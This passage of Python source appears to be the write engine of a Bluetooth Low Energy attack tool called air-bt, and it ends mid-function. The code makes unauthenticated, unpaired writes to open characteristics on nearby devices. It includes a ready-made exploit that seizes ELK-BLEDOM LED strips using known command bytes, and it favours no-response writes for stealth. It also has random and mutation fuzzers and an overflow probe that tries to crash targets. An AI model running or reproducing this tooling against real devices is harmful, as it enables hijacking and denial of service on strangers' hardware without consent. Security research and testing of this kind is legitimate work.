"""
air-bt — BLE Write Engine
Attempts unauthenticated writes on discovered open characteristics.
Supports: single write, batch write, payload library, custom hex, fuzz mode.
Created by InnerFireZ — https://github.com/InnerFireZ/air-bt
"""

import asyncio
import logging
import os
import random
import re
from dataclasses import dataclass
from datetime import datetime

from bleak import BleakClient, BleakError
from bleak.exc import BleakDeviceNotFoundError
from bleak.backends.characteristic import BleakGATTCharacteristic

from models import BTDevice, GATTCharacteristic
from payloads.library import Payload, get_payloads_for_protocol, PAYLOAD_LIBRARY, elk_bledom_rgb
from scanner.ble import get_cached_ble_device, clear_cached_ble_device, is_random_mac
# poc imported lazily to avoid circular import


def _bleak_target(dev: BTDevice):
    """Prefer cached BLEDevice over MAC string to avoid BlueZ cache misses."""
    return get_cached_ble_device(dev.mac) or dev.mac


def _not_found_msg(dev: BTDevice) -> str:
    if is_random_mac(dev.mac):
        return (f"Device not found: {dev.mac} — random/private MAC may have rotated "
                f"(iOS/Android RPA). Rescan to re-discover.")
    return (f"Device not found: {dev.mac} — out of range or BlueZ cache expired. "
            f"Rescan to re-discover.")


def _is_not_found_err(exc: Exception) -> bool:
    return (isinstance(exc, BleakDeviceNotFoundError)
            or (isinstance(exc, BleakError) and "not found" in str(exc).lower()))

# ELK-BLEDOM known write characteristic UUIDs (primary + alt variant)
_ELK_WRITE_UUIDS = [
    "0000fff3-0000-1000-8000-00805f9b34fb",
    "0000ffe9-0000-1000-8000-00805f9b34fb",
    "0000ffb2-0000-1000-8000-00805f9b34fb",
]

# Rainbow color sequence: name → (R, G, B)
_RAINBOW_STEPS = [
    ("Red",     255,   0,   0),
    ("Orange",  255, 100,   0),
    ("Yellow",  255, 220,   0),
    ("Green",     0, 255,   0),
    ("Cyan",      0, 255, 200),
    ("Blue",      0,   0, 255),
    ("Violet",  140,   0, 255),
    ("Magenta", 255,   0, 180),
    ("White",   255, 255, 255),
]

# ELK-BLEDOM command bytes
_CMD_POWER_ON     = bytes.fromhex("7e0004f00001ff00ef")
_CMD_POWER_OFF    = bytes.fromhex("7e0004f00000ff00ef")
_CMD_RAINBOW_AUTO = bytes.fromhex("7e000302870000000001ef")  # built-in rainbow cycle effect
_CMD_STROBE       = bytes.fromhex("7e000302280000000001ef")
_CMD_REQUEST_STATE = bytes.fromhex("ef0177")

log = logging.getLogger("air-bt.writer")

CONNECT_TIMEOUT = 10.0
WRITE_TIMEOUT = 5.0


@dataclass
class WriteResult:
    mac: str
    char_uuid: str
    payload: bytes
    success: bool
    response: bytes | None
    error: str | None
    timestamp: datetime = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

    def __str__(self):
        status = "OK" if self.success else f"FAIL({self.error})"
        resp = self.response.hex() if self.response else "-"
        return f"[{self.timestamp.strftime('%H:%M:%S')}] {self.mac} UUID={self.char_uuid} DATA={self.payload.hex()} → {status} RESP={resp}"


async def write_characteristic(
    client: BleakClient,
    char: GATTCharacteristic,
    data: bytes,
    use_response: bool = False,
) -> WriteResult:
    """Write data to a single characteristic. Tries write-with-response then without."""
    try:
        # Prefer WRITE_NO_RESPONSE for stealth; fall back to WRITE if needed
        if "write-without-response" in char.properties and not use_response:
            await asyncio.wait_for(
                client.write_gatt_char(char.handle, data, response=False),
                timeout=WRITE_TIMEOUT,
            )
        elif "write" in char.properties:
            resp_bytes = await asyncio.wait_for(
                client.write_gatt_char(char.handle, data, response=True),
                timeout=WRITE_TIMEOUT,
            )
            return WriteResult(
                mac=str(client.address),
                char_uuid=char.uuid,
                payload=data,
                success=True,
                response=bytes(resp_bytes) if resp_bytes else None,
                error=None,
            )
        else:
            return WriteResult(
                mac=str(client.address),
                char_uuid=char.uuid,
                payload=data,
                success=False,
                response=None,
                error="No write property",
            )

        return WriteResult(
            mac=str(client.address),
            char_uuid=char.uuid,
            payload=data,
            success=True,
            response=None,
            error=None,
        )

    except asyncio.TimeoutError:
        return WriteResult(
            mac=str(client.address), char_uuid=char.uuid, payload=data,
            success=False, response=None, error="timeout",
        )
    except BleakError as e:
        return WriteResult(
            mac=str(client.address), char_uuid=char.uuid, payload=data,
            success=False, response=None, error=str(e),
        )
    except Exception as e:
        return WriteResult(
            mac=str(client.address), char_uuid=char.uuid, payload=data,
            success=False, response=None, error=str(e),
        )


async def run_payload(
    dev: BTDevice,
    payload: Payload,
    timeout: float = CONNECT_TIMEOUT,
) -> WriteResult:
    """Execute a single named payload against a device."""
    # Find the characteristic matching the payload's UUID
    target_char = None
    for char in dev.all_characteristics():
        if char.uuid.lower() == payload.target_uuid.lower():
            target_char = char
            break

    if target_char is None:
        # UUID not yet enumerated — try anyway by UUID string
        target_char = GATTCharacteristic(
            uuid=payload.target_uuid,
            handle=0,
            properties=["write", "write-without-response"],
        )

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                return WriteResult(
                    mac=dev.mac, char_uuid=payload.target_uuid, payload=payload.data,
                    success=False, response=None, error="connection failed",
                )
            return await write_characteristic(
                client, target_char, payload.data,
                use_response=payload.requires_response,
            )
    except Exception as e:
        return WriteResult(
            mac=dev.mac, char_uuid=payload.target_uuid, payload=payload.data,
            success=False, response=None, error=str(e),
        )


async def _elk_raw_write(client: BleakClient, write_uuid: str, data: bytes):
    """Write raw bytes to an ELK-BLEDOM char (by UUID string, no handle needed)."""
    await asyncio.wait_for(
        client.write_gatt_char(write_uuid, data, response=False),
        timeout=WRITE_TIMEOUT,
    )


async def elk_bledom_rainbow_poc(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    step_delay: float = 0.35,
    cycles: int = 2,
    log_cb=None,
) -> list[WriteResult]:
    """
    ELK-BLEDOM PoC exploit — rainbow light show on any nearby LED strip.

    Steps:
      1. Connect without pairing
      2. Power ON
      3. Cycle through rainbow colors (cycles x 9 colors)
      4. Leave in built-in rainbow auto-effect mode
      5. Log every step

    Works without prior GATT enumeration — writes directly to known UUID.
    log_cb(msg: str) is called for each step if provided.
    """
    results: list[WriteResult] = []

    def _log(msg: str):
        log.info(msg)
        if log_cb:
            log_cb(msg)

    _log(f"[ELK-BLEDOM] Connecting to {dev.mac} ({dev.name}) ...")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(f"[ELK-BLEDOM] ✗ Could not connect to {dev.mac}")
                return []

            _log(f"[ELK-BLEDOM] ✓ Connected — starting rainbow PoC")

            # Find which write UUID is available on this device
            write_uuid = None
            if dev.gatt_enumerated:
                for uuid in _ELK_WRITE_UUIDS:
                    if any(c.uuid.lower() == uuid for c in dev.all_characteristics()):
                        write_uuid = uuid
                        break

            if write_uuid is None:
                # Try each known UUID blindly (no prior enumeration needed)
                for uuid in _ELK_WRITE_UUIDS:
                    try:
                        await asyncio.wait_for(
                            client.write_gatt_char(uuid, _CMD_POWER_ON, response=False),
                            timeout=3.0,
                        )
                        write_uuid = uuid
                        _log(f"[ELK-BLEDOM] ✓ Active write UUID: {uuid}")
                        break
                    except Exception:
                        continue

            if write_uuid is None:
                _log(f"[ELK-BLEDOM] ✗ No writable LED char found on {dev.mac}")
                return []

            # ── Step 1: Power ON ────────────────────────────────────────────
            try:
                await _elk_raw_write(client, write_uuid, _CMD_POWER_ON)
                results.append(WriteResult(
                    mac=dev.mac, char_uuid=write_uuid, payload=_CMD_POWER_ON,
                    success=True, response=None, error=None,
                ))
                _log(f"[ELK-BLEDOM] ► Power ON sent")
                await asyncio.sleep(0.3)
            except Exception as e:
                _log(f"[ELK-BLEDOM] ✗ Power ON failed: {e}")
                return results

            # ── Step 2: Rainbow color cycle ─────────────────────────────────
            _log(f"[ELK-BLEDOM] ► Starting rainbow cycle ({cycles}x {len(_RAINBOW_STEPS)} colors) ...")
            for cycle in range(cycles):
                for color_name, r, g, b in _RAINBOW_STEPS:
                    cmd = bytes([0x7e, 0x00, 0x05, 0x03, r, g, b, 0x00, 0x00, 0xef])
                    try:
                        await _elk_raw_write(client, write_uuid, cmd)
                        results.append(WriteResult(
                            mac=dev.mac, char_uuid=write_uuid, payload=cmd,
                            success=True, response=None, error=None,
                        ))
                        _log(f"[ELK-BLEDOM]   cycle {cycle+1}/{cycles} → {color_name} ({r},{g},{b})")
                    except Exception as e:
                        results.append(WriteResult(
                            mac=dev.mac, char_uuid=write_uuid, payload=cmd,
                            success=False, response=None, error=str(e),
                        ))
                        _log(f"[ELK-BLEDOM]   ✗ {color_name} failed: {e}")
                    await asyncio.sleep(step_delay)

            # ── Step 3: Leave in rainbow auto-effect mode ───────────────────
            try:
                await _elk_raw_write(client, write_uuid, _CMD_RAINBOW_AUTO)
                results.append(WriteResult(
                    mac=dev.mac, char_uuid=write_uuid, payload=_CMD_RAINBOW_AUTO,
                    success=True, response=None, error=None,
                ))
                _log(f"[ELK-BLEDOM] ✓ Rainbow auto-effect activated — PoC complete on {dev.mac}")
            except Exception as e:
                _log(f"[ELK-BLEDOM] ✗ Rainbow auto-effect failed: {e}")

    except asyncio.TimeoutError:
        _log(f"[ELK-BLEDOM] ✗ Connection timeout: {dev.mac}")
    except BleakError as e:
        if _is_not_found_err(e):
            clear_cached_ble_device(dev.mac)
            _log(f"[ELK-BLEDOM] ✗ {_not_found_msg(dev)}")
        else:
            _log(f"[ELK-BLEDOM] ✗ BLE error: {e}")
    except Exception as e:
        _log(f"[ELK-BLEDOM] ✗ Unexpected error: {e}")

    return results


async def exploit_open_writes(
    dev: BTDevice,
    custom_data: bytes | None = None,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[WriteResult]:
    """
    Attempt writes on all open (no-auth) writable characteristics.
    Protocol-aware: ELK-BLEDOM devices get the rainbow PoC automatically.
    If custom_data is None, uses protocol-matched payload library first,
    then falls back to a generic probe byte.
    """
    # ── ELK-BLEDOM: run dedicated rainbow PoC ────────────────────────────────
    # Detect by protocol name OR by presence of known ELK-BLEDOM service UUIDs
    _elk_svc_uuids = {"0000fff0-0000-1000-8000-00805f9b34fb",
                      "0000ffe5-0000-1000-8000-00805f9b34fb",
                      "0000ffb0-0000-1000-8000-00805f9b34fb"}
    _found_elk_uuids = {s.uuid.lower() for s in dev.services} & _elk_svc_uuids
    _is_elk = dev.protocol == "ELK-BLEDOM" or bool(_found_elk_uuids) or \
              any(kw in dev.name.lower() for kw in [
                  "elk-ble", "elk-bulb", "elk-lamp", "elkblue", "melk",
                  "ledble", "lednet", "led_ble", "ledstrip", "qhm-led",
                  "triones", "magic home", "ilinker", "btle-led", "ble-led",
              ])

    if _is_elk and custom_data is None:
        if dev.protocol != "ELK-BLEDOM":
            dev.protocol = "ELK-BLEDOM"   # fix protocol label in TUI
        return await elk_bledom_rainbow_poc(dev, timeout=timeout, log_cb=log_cb)

    # ── Smart PoC dispatcher for known device classes ─────────────────────────
    if custom_data is None and dev.gatt_enumerated:
        from scanner.poc import run_best_poc
        return await run_best_poc(dev, timeout=timeout, log_cb=log_cb)

    open_chars = dev.open_write_chars()
    if not open_chars:
        log.info(f"{dev.mac}: no open write characteristics found")
        return []

    results: list[WriteResult] = []
    protocol_payloads = {p.target_uuid.lower(): p for p in get_payloads_for_protocol(dev.protocol)}

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                log.warning(f"Could not connect to {dev.mac}")
                return []

            for char in open_chars:
                uuid_lower = char.uuid.lower()
                if custom_data:
                    data = custom_data
                elif uuid_lower in protocol_payloads:
                    data = protocol_payloads[uuid_lower].data
                else:
                    # Generic probe
                    data = bytes([0x01])

                result = await write_characteristic(client, char, data)
                results.append(result)
                log.info(str(result))

                # Short delay between writes
                await asyncio.sleep(0.1)

    except Exception as e:
        if _is_not_found_err(e):
            clear_cached_ble_device(dev.mac)
            log.warning(_not_found_msg(dev))
        else:
            log.warning(f"Write session error {dev.mac}: {e}")

    return results


async def fuzz_characteristic(
    dev: BTDevice,
    char_uuid: str,
    iterations: int = 50,
    min_len: int = 1,
    max_len: int = 20,
    timeout: float = CONNECT_TIMEOUT,
) -> list[WriteResult]:
    """
    Fuzz a specific characteristic with random payloads.
    Logs all results including crashes (no response after successful connect).
    """
    target_char = None
    for char in dev.all_characteristics():
        if char.uuid.lower() == char_uuid.lower():
            target_char = char
            break

    if target_char is None:
        target_char = GATTCharacteristic(
            uuid=char_uuid, handle=0,
            properties=["write", "write-without-response"],
        )

    results: list[WriteResult] = []

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                return []

            for i in range(iterations):
                length = random.randint(min_len, max_len)
                data = os.urandom(length)
                result = await write_characteristic(client, target_char, data)
                results.append(result)
                log.debug(f"Fuzz {i+1}/{iterations}: {result}")
                await asyncio.sleep(0.05)

    except Exception as e:
        if _is_not_found_err(e):
            clear_cached_ble_device(dev.mac)
            log.warning(_not_found_msg(dev))
        else:
            log.warning(f"Fuzz session ended {dev.mac}: {e}")

    return results


# ── Mutation fuzzer ──────────────────────────────────────────────────────────
#
# Unlike the random fuzzer (fuzz_characteristic), this one keeps the payload
# structurally plausible: it starts from a seed (last read value or all-zeros)
# and applies targeted mutations per iteration.  Each mutation strategy probes
# a different bug class:
#
#   bit_flip        → flag/mode field corruption
#   byte_boundary   → integer overflow at boundary values (0x00/0xFF/0x7F/0x80)
#   byte_random     → general coverage
#   nibble_swap     → alignment / nibble-ordering parser bugs
#   truncate        → short-input / null-pointer dereferences
#   extend_zeros    → length-validation bypass (device accepts over-MTU data)
#   extend_ff       → same but with 0xFF fill (value-dependent overflow)
#   length_corrupt  → first-byte-as-length confusion (very common in BLE protocols)
#   zero_range      → null cluster injection
#   ff_range        → saturation cluster injection

_BOUNDARY_VALS = [0x00, 0xFF, 0x7F, 0x80, 0x01, 0xFE]

# Weighted pool: higher repetition = higher sampling probability
_STRATEGY_POOL = (
    ["bit_flip"]       * 25 +
    ["byte_boundary"]  * 25 +
    ["byte_random"]    * 15 +
    ["truncate"]       * 10 +
    ["extend_zeros"]   *  8 +
    ["extend_ff"]      *  7 +
    ["nibble_swap"]    *  5 +
    ["length_corrupt"] *  3 +
    ["zero_range"]     *  1 +
    ["ff_range"]       *  1
)


def _mutate(seed: bytes, strategy: str) -> bytes:
    """Apply one mutation strategy to seed. Returns a new bytes object."""
    if not seed:
        seed = b"\x00\x00\x00\x00"
    d = bytearray(seed)
    n = len(d)

    if strategy == "bit_flip":
        pos = random.randrange(n)
        d[pos] ^= (1 << random.randrange(8))

    elif strategy == "byte_boundary":
        pos = random.randrange(n)
        d[pos] = random.choice(_BOUNDARY_VALS)

    elif strategy == "byte_random":
        pos = random.randrange(n)
        d[pos] = random.randint(0, 255)

    elif strategy == "nibble_swap":
        pos = random.randrange(n)
        b = d[pos]
        d[pos] = ((b & 0x0F) << 4) | ((b & 0xF0) >> 4)

    elif strategy == "truncate" and n > 1:
        d = d[:max(1, n - random.randint(1, max(1, n // 2)))]

    elif strategy == "extend_zeros":
        d.extend(bytes(random.randint(1, min(8, 512 - n))))

    elif strategy == "extend_ff":
        d.extend(bytes([0xFF] * random.randint(1, min(8, 512 - n))))

    elif strategy == "length_corrupt" and n > 0:
        d[0] = random.choice([0x00, 0x01, max(0, n - 1), n, n + 1, 0xFF, 0x7F, 0x80])

    elif strategy == "zero_range":
        start = random.randrange(n)
        end   = min(start + random.randint(1, 4), n)
        for i in range(start, end):
            d[i] = 0x00

    elif strategy == "ff_range":
        start = random.randrange(n)
        end   = min(start + random.randint(1, 4), n)
        for i in range(start, end):
            d[i] = 0xFF

    return bytes(d)


def _extract_att_code(err_str: str) -> str | None:
    """Extract ATT error code (e.g. '0x0d') from a BleakError string."""
    e = err_str.lower()
    m = re.search(r"\b(0x[0-9a-f]{2})\b", e)
    if m:
        return m.group(1)
    if "authentication" in e or "insufficient auth" in e:
        return "0x05"
    if "encryption" in e or "insufficient encr" in e:
        return "0x0f"
    if "invalid attribute length" in e:
        return "0x0d"
    if "not permitted" in e:
        return "0x03"
    if "not supported" in e:
        return "0x06"
    return None


# Human-readable ATT error descriptions for the summary
_ATT_DESCRIPTIONS = {
    "0x01": "Invalid Handle",
    "0x02": "Read Not Permitted",
    "0x03": "Write Not Permitted",
    "0x04": "Invalid PDU",
    "0x05": "Insufficient Authentication",
    "0x06": "Request Not Supported",
    "0x07": "Invalid Offset",
    "0x08": "Insufficient Authorization",
    "0x0a": "Attribute Not Found",
    "0x0d": "Invalid Attribute Length",   # correct enforcement
    "0x0e": "Unlikely Error",             # device-side bug indicator
    "0x0f": "Insufficient Encryption",
    "0x11": "Attribute Not Long",
}


@dataclass
class MutationResult:
    char_uuid: str
    iteration: int
    strategy: str
    payload: bytes
    outcome: str        # "accepted" | "rejected" | "timeout" | "disconnect" | "error"
    att_error: str | None = None
    crashed: bool = False

    @property
    def is_notable(self) -> bool:
        if self.outcome in ("disconnect", "timeout"):
            return True
        # Accepted oversized write from extend strategy — length-validation bypass
        if self.outcome == "accepted" and self.strategy.startswith("extend") and len(self.payload) > 20:
            return True
        # Unexpected ATT error codes (not the four "normal" auth/length rejections)
        if self.att_error and self.att_error not in ("0x02", "0x03", "0x05", "0x06", "0x0d", "0x0f"):
            return True
        return False


async def fuzz_mutate(
    dev: BTDevice,
    char_uuid: str,
    iterations: int = 100,
    seed: bytes | None = None,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[MutationResult]:
    """
    Mutation-based fuzzer for a single BLE characteristic.

    Starts from a structured seed and applies semantic mutations each iteration.
    Maintains a persistent connection; detects crashes via reconnect probe after
    each unexpected disconnect. Reports ATT error frequency and strategy heatmap.
    """
    def _log(msg: str):
        log.info(msg)
        if log_cb:
            log_cb(msg)

    # Locate target char
    target: GATTCharacteristic | None = None
    for char in dev.all_characteristics():
        if char.uuid.lower() == char_uuid.lower():
            target = char
            break
    if target is None:
        target = GATTCharacteristic(uuid=char_uuid, handle=0,
                                    properties=["write", "write-without-response"])

    # Seed: last read value (if known) else all-zeros at a sensible length
    if seed is None:
        seed = (target.value[:20] if target.value else bytes(4))

    use_resp = "write" in (target.properties or [])

    _log(f"[MUTFUZZ] Mutation fuzzer  —  {dev.mac}  char={char_uuid[:8]}…")
    _log(f"[MUTFUZZ] Seed      : {seed.hex()}  ({len(seed)} B)")
    _log(f"[MUTFUZZ] Write mode: {'WRITE (response)' if use_resp else 'WRITE_NO_RESP'}")
    _log(f"[MUTFUZZ] Iterations: {iterations}  |  {len(set(_STRATEGY_POOL))} mutation strategies")

    results: list[MutationResult] = []
    error_counts: dict[str, int] = {}       # att_code → count
    strategy_accepts: dict[str, int] = {}   # strategy → accepted count

    accepted = rejected = timeouts = disconnects = crashes = 0
    client: BleakClient | None = None

    try:
        i = 0
        while i < iterations:
            # ── (Re)connect if needed ─────────────────────────────────────
            if client is None or not client.is_connected:
                if i > 0:
                    # Unexpected disconnect — probe for crash before reconnecting
                    _log(f"[MUTFUZZ] ─ disconnect at iter {i} — probing for crash ─")
                    await asyncio.sleep(1.5)
                    try:
                        probe_c = BleakClient(_bleak_target(dev), timeout=5.0, pair=False)
                        await probe_c.connect()
                        alive = probe_c.is_connected
                        try:
                            await probe_c.disconnect()
                        except Exception:
                            pass
                    except Exception:
                        alive = False

                    if not alive:
                        crashes += 1
                        if results:
                            results[-1].crashed = True
                        _log(f"[MUTFUZZ] 💀 Device crashed — stopping")
                        break
                    _log(f"[MUTFUZZ] ✓ Device alive — reconnecting")

                try:
                    client = BleakClient(_bleak_target(dev), timeout=timeout, pair=False)
                    await client.connect()
                    if not client.is_connected:
                        _log(f"[MUTFUZZ] ✗ Connection failed — aborting")
                        break
                except BleakError as e:
                    if _is_not_found_err(e):
                        clear_cached_ble_device(dev.mac)
                        _log(f"[MUTFUZZ] ✗ {_not_found_msg(dev)}")
                    else:
                        _log(f"[MUTFUZZ] ✗ Connect error: {e}")
                    break
                except Exception as e:
                    _log(f"[MUTFUZZ] ✗ Connect error: {e}")
                    break

            # ── Mutate + write ───────────────────────────────────────────
            strategy = random.choice(_STRATEGY_POOL)
            payload  = _mutate(seed, strategy)
            outcome  = "accepted"
            att_err: str | None = None

            try:
                await asyncio.wait_for(
                    client.write_gatt_char(
                        target.handle or target.uuid, payload, response=use_resp
                    ),
                    timeout=WRITE_TIMEOUT,
                )
                accepted += 1
                strategy_accepts[strategy] = strategy_accepts.get(strategy, 0) + 1

            except asyncio.TimeoutError:
                outcome   = "timeout"
                timeouts += 1

            except BleakError as e:
                if not client.is_connected or _is_disconnect_err(e):
                    outcome      = "disconnect"
                    disconnects += 1
                    client       = None
                    clear_cached_ble_device(dev.mac)
                else:
                    outcome   = "rejected"
                    rejected += 1
                    att_err   = _extract_att_code(str(e))
                    if att_err:
                        error_counts[att_err] = error_counts.get(att_err, 0) + 1

            except Exception as e:
                outcome = "error"
                _log(f"[MUTFUZZ]   ✗ iter {i + 1}: {e}")

            r = MutationResult(
                char_uuid=char_uuid, iteration=i + 1,
                strategy=strategy, payload=payload,
                outcome=outcome, att_error=att_err,
            )
            results.append(r)

            if r.is_notable:
                hex_p = payload.hex()[:24] + ("…" if len(payload) > 12 else "")
                _log(f"[MUTFUZZ] ✦ #{i+1:3}  [{strategy:15}]  {hex_p:26}  → {outcome.upper()}")
            elif (i + 1) % 20 == 0:
                _log(f"[MUTFUZZ]   #{i+1}/{iterations}  "
                     f"accept={accepted} reject={rejected} "
                     f"timeout={timeouts} disc={disconnects}")

            i += 1
            await asyncio.sleep(0.05)

    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

    # ── Summary ──────────────────────────────────────────────────────────────
    _log(f"[MUTFUZZ] ──────────────────────────────────────────────")
    _log(f"[MUTFUZZ] {len(results)}/{iterations} iters  "
         f"accept={accepted}  reject={rejected}  "
         f"timeout={timeouts}  disc={disconnects}  crash={crashes}")

    if error_counts:
        parts = []
        for code, cnt in sorted(error_counts.items(), key=lambda x: -x[1]):
            desc = _ATT_DESCRIPTIONS.get(code, "?")
            parts.append(f"{code}({desc})×{cnt}")
        _log(f"[MUTFUZZ] ATT errors: " + "  ".join(parts))

    if strategy_accepts:
        top = sorted(strategy_accepts.items(), key=lambda x: -x[1])[:5]
        _log(f"[MUTFUZZ] Accepted by strategy: " +
             "  ".join(f"{s}×{n}" for s, n in top))

    notable = [r for r in results if r.is_notable]
    if notable:
        _log(f"[MUTFUZZ] Notable events ({len(notable)}):")
        for r in notable[:10]:
            _log(f"[MUTFUZZ]   #{r.iteration:3}  [{r.strategy:15}]  "
                 f"{r.payload.hex()[:24]}  →  {r.outcome.upper()}"
                 + ("  ← CRASHED" if r.crashed else ""))

    return results


# ── Overflow / boundary probe ─────────────────────────────────────────────────

# Payload sizes chosen to hit key boundaries:
#   0         → zero-length (crashes some stacks)
#   1         → minimal write
#   20        → default ATT MTU payload max (MTU 23 − 3)
#   21        → one byte over default MTU — first real test
#   64/128    → typical after MTU exchange
#   244       → common max after MTU exchange (247 − 3)
#   255/256   → 8-bit length field boundary
#   512       → BLE Prepare Write (long write) max
OVERFLOW_SIZES = [0, 1, 20, 21, 64, 128, 244, 255, 256, 512]

_SEVERITY_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


@dataclass
class OverflowFinding:
    char_uuid: str
    description: str
    size: int
    outcome: str    # accepted | length_rejected | auth_required | disconnect | timeout | write_rejected | not_long | error
    severity: str   # CRITICAL | HIGH | MEDIUM | LOW | INFO
    detail: str
    raw_error: str | None = None
    crashed: bool | None = None  # None = no disconnect; True = crashed; False = recovered


def _classify_write_error(err_str: str) -> tuple[str, str, str]:
    """Return (outcome, severity, detail) from a BleakError message."""
    e = err_str.lower()
    if "invalid attribute length" in e or "0x0d" in e or "att error: 0x0d" in e:
        return "length_rejected", "INFO", "Length rejected (ATT_ERR_INVALID_ATTRIBUTE_LEN 0x0D) — correct enforcement"
    if "authentication" in e or "0x05" in e or "encryption" in e or "0x0f" in e or "insufficient" in e:
        return "auth_required", "INFO", "Authentication/encryption required"
    if "not permitted" in e or "0x03" in e:
        return "write_rejected", "LOW", "Write not permitted (ATT 0x03)"
    if "not supported" in e or "0x06" in e:
        return "not_supported", "LOW", "Request not supported (ATT 0x06)"
    if "attribute not long" in e or "0x11" in e:
        return "not_long", "LOW", "Device lacks Prepare Write support (ATT 0x11)"
    if "unlikely error" in e or "0x0e" in e:
        return "unlikely_error", "MEDIUM", "Unlikely error (ATT 0x0E) — possible internal device fault"
    return "error", "LOW", f"Unclassified error: {err_str}"


def _is_disconnect_err(exc: Exception) -> bool:
    """True if the error signals a lost connection (not an ATT-layer rejection)."""
    if _is_not_found_err(exc):
        return True
    s = str(exc).lower()
    return (
        "not connected" in s
        or "disconnected" in s
        or "input/output error" in s
        or "broken pipe" in s
        or "connection reset" in s
    )


async def _reconnect_probe(dev: BTDevice, wait: float = 2.0, timeout: float = 5.0) -> bool:
    """
    Wait briefly, then check if the device is still reachable.
    Returns True = alive (not crashed), False = unreachable (probable crash/reboot).
    """
    await asyncio.sleep(wait)
    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            return client.is_connected
    except Exception:
        return False


async def probe_overflow(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[OverflowFinding]:
    """
    Probe all open-write characteristics with escalating payload sizes.

    Detects:
      - Missing length validation (device silently accepts oversized writes)
      - Stack overflow / crash (device disconnects and does not recover)
      - DoS via write (operation times out or device goes silent)
      - Correct ATT-layer enforcement (informational)

    One connection per characteristic so a crash on char N does not block char N+1.
    """
    def _log(msg: str):
        log.info(msg)
        if log_cb:
            log_cb(msg)

    open_chars = dev.open_write_chars()
    if not open_chars:
        _log("[OVERFLOW] No open write characteristics to probe")
        return []

    findings: list[OverflowFinding] = []
    sizes_str = " ".join(str(s) for s in OVERFLOW_SIZES)
    _log(f"[OVERFLOW] Boundary probe: {dev.mac} ({dev.name})")
    _log(f"[OVERFLOW] Targets : {len(open_chars)} writable char(s)")
    _log(f"[OVERFLOW] Sizes   : {sizes_str} bytes")
    _log(f"[OVERFLOW] Pattern : all-zeros (0x00 × N)")

    abort = False  # set True on crash so we stop probing further chars

    for char in open_chars:
        if abort:
            break

        desc = char.description or ""
        _log(f"[OVERFLOW] ── {char.uuid}" + (f" ({desc})" if desc else "") + " ──")

        # Prefer write-with-response to get ATT error codes; fall back to no-response
        use_response = "write" in char.properties
        _log(f"[OVERFLOW]   Write mode : {'WRITE (response)' if use_response else 'WRITE_NO_RESP'}")

        disc_size  = 0
        disc_err   = ""
        got_disc   = False

        try:
            async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
                if not client.is_connected:
                    _log(f"[OVERFLOW]   ✗ Could not connect")
                    continue

                for size in OVERFLOW_SIZES:
                    if not client.is_connected:
                        got_disc  = True
                        disc_size = size
                        break

                    payload = bytes(size)

                    try:
                        await asyncio.wait_for(
                            client.write_gatt_char(
                                char.handle or char.uuid, payload, response=use_response
                            ),
                            timeout=WRITE_TIMEOUT,
                        )

                        # Write accepted ── classify by size
                        if size == 0:
                            sev    = "MEDIUM"
                            detail = "Zero-length write accepted — possible missing guard"
                        elif size <= 20:
                            sev    = "INFO"
                            detail = f"{size}B accepted (within default 20-byte ATT MTU)"
                        elif size <= 127:
                            sev    = "MEDIUM"
                            detail = f"{size}B accepted (over default 20B MTU) — no length rejection seen"
                        elif size <= 255:
                            sev    = "HIGH"
                            detail = f"{size}B accepted — very likely no length validation"
                        else:
                            sev    = "HIGH"
                            detail = f"{size}B accepted (past 8-bit boundary) — probable integer overflow risk"

                        findings.append(OverflowFinding(
                            char_uuid=char.uuid, description=desc,
                            size=size, outcome="accepted",
                            severity=sev, detail=detail,
                        ))
                        _log(f"[OVERFLOW]   {size:>4}B  [ ACCEPTED ] {detail}")

                    except asyncio.TimeoutError:
                        findings.append(OverflowFinding(
                            char_uuid=char.uuid, description=desc,
                            size=size, outcome="timeout", severity="MEDIUM",
                            detail=f"{size}B write timed out — possible DoS/hang",
                        ))
                        _log(f"[OVERFLOW]   {size:>4}B  [ TIMEOUT  ] possible DoS/hang")
                        await asyncio.sleep(0.5)

                    except BleakError as e:
                        if _is_disconnect_err(e):
                            got_disc  = True
                            disc_size = size
                            disc_err  = str(e)
                            break

                        outcome, sev, detail = _classify_write_error(str(e))
                        findings.append(OverflowFinding(
                            char_uuid=char.uuid, description=desc,
                            size=size, outcome=outcome, severity=sev, detail=detail,
                            raw_error=str(e),
                        ))
                        tag = "[ INFO    ]" if sev == "INFO" else "[ WARN    ]"
                        _log(f"[OVERFLOW]   {size:>4}B  {tag} {detail}")

                        if outcome == "auth_required":
                            _log(f"[OVERFLOW]   → Auth gates all writes — skipping remaining sizes")
                            break

                    except Exception as e:
                        _log(f"[OVERFLOW]   {size:>4}B  [ ERROR   ] Unexpected: {e}")

                    await asyncio.sleep(0.08)

        except asyncio.TimeoutError:
            _log(f"[OVERFLOW] ✗ Connection timeout: {dev.mac}")
            abort = True
        except BleakError as e:
            if _is_not_found_err(e):
                clear_cached_ble_device(dev.mac)
                _log(f"[OVERFLOW] ✗ {_not_found_msg(dev)}")
                abort = True
            else:
                _log(f"[OVERFLOW] ✗ BLE error: {e}")
        except Exception as e:
            _log(f"[OVERFLOW] ✗ Unexpected error: {e}")

        if got_disc:
            clear_cached_ble_device(dev.mac)
            _log(f"[OVERFLOW]   {disc_size:>4}B  [ DISC!   ] Connection dropped — probing for crash ...")
            alive = await _reconnect_probe(dev)
            crashed = not alive
            sev    = "CRITICAL" if crashed else "HIGH"
            label  = "Device crashed (unreachable after disconnect)" if crashed else "Disconnected but recovered"
            detail = f"{label} — triggered by {disc_size}-byte write"
            findings.append(OverflowFinding(
                char_uuid=char.uuid, description=desc,
